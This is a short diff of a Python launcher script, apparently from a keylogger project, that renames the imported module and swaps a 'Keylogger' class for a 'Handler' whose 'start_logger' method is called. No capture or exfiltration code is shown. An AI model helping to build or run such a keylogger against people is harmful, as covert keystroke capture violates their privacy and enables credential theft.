@@ -2,7 +2,7 @@ import argparse
 import textwrap
 import sys
 sys.path.insert(0, './modules')
-from modules import logger
+from modules import handler
 
 # Arg parse
 if __name__ == "__main__":
@@ -19,6 +19,6 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    kl = logger.Keylogger(args)
-    kl.start()
+    handler = handler.Handler(args)
+    handler.start_logger()
 
